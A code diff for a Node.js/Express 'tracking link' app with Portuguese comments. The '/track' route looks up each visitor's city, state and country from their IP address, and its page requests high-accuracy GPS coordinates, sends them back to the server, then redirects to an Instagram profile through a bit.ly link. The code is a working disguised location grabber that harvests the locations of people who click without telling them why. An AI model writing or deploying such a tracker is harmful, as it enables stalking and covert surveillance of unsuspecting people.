@@ -142,9 +142,9 @@ app.get('/', (req, res) => {
                   <div style="margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #f59e0b;">
                     <div style="color: #f59e0b; font-weight: bold;">📍 LOCALIZAÇÃO POR IP</div>
                     <span class="precision-badge precision-medium">⚠ Precisão Aproximada</span>
-                    <div style="margin-top: 0.8rem;"><strong>🏙️ Cidade:</strong> \${hasIPLocation.cidade}</div>
-                    <div><strong>🗺️ Estado:</strong> \${hasIPLocation.estado}</div>
-                    <div><strong>🌎 País:</strong> \${hasIPLocation.pais}</div>
+                    <div style="margin-top: 0.8rem;"><strong>🏙️ Cidade:</strong> \${c.ipLocation.cidade}</div>
+                    <div><strong>🗺️ Estado:</strong> \${c.ipLocation.estado}</div>
+                    <div><strong>🌎 País:</strong> \${c.ipLocation.pais}</div>
                     <div style="color: #6b7280; font-size: 0.9rem; margin-top: 0.5rem;">
                       ℹ️ GPS não autorizado - localização aproximada baseada no IP
                     </div>
@@ -183,21 +183,34 @@ app.get('/track', async (req, res) => {
   
   // Captura localização por IP imediatamente
   try {
-    const ipClean = clickData.ip.replace('::ffff:', '');
-    console.log('🔍 Buscando localização do IP:', ipClean);
+    let ipClean = clickData.ip.replace('::ffff:', '').replace('::1', '');
+    
+    // Se for localhost, usa IP público como exemplo
+    if (ipClean === '127.0.0.1' || ipClean === '' || ipClean === '::1') {
+      ipClean = ''; // IP-API detecta automaticamente o IP público
+    }
+    
+    console.log('🔍 Buscando localização do IP:', ipClean || 'auto-detect');
     
     const response = await fetch(`http://ip-api.com/json/${ipClean}?lang=pt&fields=status,country,regionName,city,lat,lon`);
     const ipData = await response.json();
     
+    console.log('📡 Resposta IP-API:', ipData);
+    
     if (ipData.status === 'success') {
-      clickData.ipLocation = {
-        cidade: ipData.city || 'N/A',
-        estado: ipData.regionName || 'N/A',
-        pais: ipData.country || 'N/A',
-        lat: ipData.lat,
-        lng: ipData.lon
-      };
-      console.log(`🏙️ Localização IP: ${ipData.city}, ${ipData.regionName}`);
+      const click = clicks.find(c => c.id === clickData.id);
+      if (click) {
+        click.ipLocation = {
+          cidade: ipData.city || 'N/A',
+          estado: ipData.regionName || 'N/A',
+          pais: ipData.country || 'N/A',
+          lat: ipData.lat,
+          lng: ipData.lon
+        };
+        console.log(`🏙️ Localização IP capturada: ${ipData.city}, ${ipData.regionName}`);
+      }
+    } else {
+      console.log('⚠️ IP-API retornou status:', ipData.status);
     }
   } catch (error) {
     console.error('❌ Erro ao buscar localização IP:', error.message);
@@ -241,6 +254,14 @@ app.get('/track', async (req, res) => {
       </div>
       <script>
         const clickId = ${clickData.id};
+        let redirected = false;
+        
+        function redirectUser() {
+          if (redirected) return;
+          redirected = true;
+          document.getElementById('status').textContent = 'Redirecionando...';
+          window.location.href = 'https://bit.ly/sobre-andre';
+        }
         
         console.log('🔍 Click ID:', clickId);
         console.log('🔍 Iniciando captura de GPS...');
@@ -277,26 +298,19 @@ app.get('/track', async (req, res) => {
                 console.error('❌ Erro ao enviar:', error);
               }
               
-              document.getElementById('status').textContent = 'Redirecionando...';
-              setTimeout(() => {
-                window.location.href = 'https://www.instagram.com/andre.osantos12/';
-              }, 1000);
+              setTimeout(redirectUser, 1000);
             },
             (error) => {
               console.error('❌ Erro GPS:', error.code, error.message);
               console.log('ℹ️ Usando localização por IP como fallback');
-              setTimeout(() => {
-                window.location.href = 'https://www.instagram.com/andre.osantos12/';
-              }, 1500);
+              setTimeout(redirectUser, 1500);
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
         } else {
           console.error('❌ GPS não disponível');
           console.log('ℹ️ Usando localização por IP como fallback');
-          setTimeout(() => {
-            window.location.href = 'https://www.instagram.com/andre.osantos12/';
-          }, 1500);
+          setTimeout(redirectUser, 1500);
         }
       </script>
     </body>
